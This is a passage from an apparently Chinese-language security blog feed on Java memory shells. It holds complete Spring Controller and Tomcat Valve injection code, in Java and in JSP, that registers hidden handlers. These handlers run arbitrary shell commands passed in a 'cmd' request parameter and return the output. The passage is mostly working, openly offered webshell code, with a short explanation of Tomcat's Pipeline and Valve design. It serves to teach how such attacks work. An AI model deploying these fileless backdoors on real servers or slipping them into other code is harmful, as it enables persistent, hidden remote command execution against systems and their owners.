通过上下文获取RequestMappingHandlerMapping</span></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="comment">// 获取恶意类的恶意方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">vulnMethod</span> <span class="operator">=</span> VulnController.class.getMethod(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="comment">// 定义访问恶意Controller的url</span></span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/vuln&quot;</span>);</span><br><span class="line">        <span class="comment">// 定义允许访问恶意controller的HTTP请求方法（GET/POST）</span></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">condition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="comment">// 动态注册Controller</span></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, condition, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">VulnController</span> <span class="variable">vulnController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnController</span>();</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, vulnController, vulnMethod);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnController</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">VulnController</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cmd</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 适用于SpringMVC+Tomcat的环境，以及Springboot 2.6+环境</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringControllerMemShell2</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/inject2&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SpringControllerMemShell2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">vulnMethod</span> <span class="operator">=</span> VulnController2.class.getMethod(<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/vuln&quot;</span>)</span><br><span class="line">                    .options(config)</span><br><span class="line">                    .build();</span><br><span class="line">            <span class="type">VulnController2</span> <span class="variable">vulnController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnController2</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info, vulnController, vulnMethod);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnController2</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">VulnController2</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/19/Spring-Controller/1713493654995-1d7b2350-c810-4c90-8b70-b3f5d3aeb13d.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Valve</title>
      <link href="/2024/05/18/Tomcat-Valve/"/>
      <url>/2024/05/18/Tomcat-Valve/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>在之前学习Listener内存马、Filter内存马和Servlet内存马时，下断点的调用栈中总有一个常见的字眼Valve，调用链中调用了很多与Valve相关的方法的invoke方法。</p><p><img src="/2024/05/18/Tomcat-Valve/1.png"></p><p>Valve翻译过来是阀门的意思。在Tomcat中，四大容器类StandardEngine、StandardHost、StandardContext、StandardWrapper中都有一个管道（PipeLine）及若干阀门（Valve）。</p><p>PipeLine伴随容器类对象生成时自动生成，就像容器的逻辑总线，按照顺序加载各个Valve，而Valve是逻辑的具体实现，通过PipeLine完成各个Valve之间的调用。在PipeLine生成时，同时会生成一个缺省Valve实现，就是在调试中经常看到的StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve。</p><p>Tomcat在处理一个请求调用逻辑时，为了整体架构的每个组件的可伸缩性和可扩展性，使用了职责链模式来实现客户端请求的处理。在Tomcat中定义了两个接口：Pipeline（管道）和Valve（阀门）。Pipeline中有一个最基础的Valve，它始终位于末端，最后执行，且封装了具体的请求处理和输出响应的过程。Pipeline提供了addValve方法，可以添加新Valve在BasicValve之前，并按照添加顺序执行。</p><p><img src="/2024/05/18/Tomcat-Valve/2.png"></p><p>Tomcat容器的四个子容器中都有基础的Valve实现（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），它们同时维护了一个Pipeline实例（StandardPipeline）。也就是说，可以在任何层级的容器上针对请求处理进行扩展，且这四个Valve的基础实现都继承了ValveBase。</p><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><p>跟进一下上文最开始调用栈图中的org.apache.catalina.connector.CoyoteAdapter#service方法，该方法调用StandardEngine#getPipline方法来获取其Pipeline，接着获取Pipeline中的第一个Valve并调用该Valve的invoke方法。</p><p><img src="/2024/05/18/Tomcat-Valve/3.png"></p><p>跟进invoke方法，发现其调用的是org.apache.catalina.core.StandardEngineValve#invoke方法，StandardEngineValve继承了ValveBase，且在invoke方法中能拿到request和response。</p><p><img src="/2024/05/18/Tomcat-Valve/4.png"></p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>动态注入Valve内存马的具体思路如下：</p><ol><li>继承并构造一个恶意的Valve；</li><li>获取StandardContext；</li><li>通过StandardContext获取当前容器的StandardPipeline；</li><li>调用StandardContext#addValve方法添加恶意Valve。</li></ol><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ValveMemoryShellServlet&quot;, value = &quot;/ValveMemoryShellServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ValveMemoryShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">ValveBase</span> <span class="variable">valveBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                    <span class="keyword">if</span> (((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                            isLinux = <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        ((HttpServletResponse) response).getWriter().write(output);</span><br><span class="line">                        ((HttpServletResponse) response).getWriter().flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            standardContext.getPipeline().addValve(valveBase);</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Valve Inject Successfully...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Valve/5.png"></p><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">ValveBase</span> <span class="variable">valveBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                ((HttpServletResponse) response).getWriter().write(output);</span><br><span class="line">                ((HttpServletResponse) response).getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    standardContext.getPipeline().addValve(valveBase);</span><br><span class="line">    response.getWriter().write(<span class="string">&quot;Valve Inject Successfully...&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Valve/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Upgrade</title>
      <link href="/2024/05/18/Tomcat-Upgrade/"/>
      <url>/2024/05/18/Tomcat-Upgrade/</url>
      
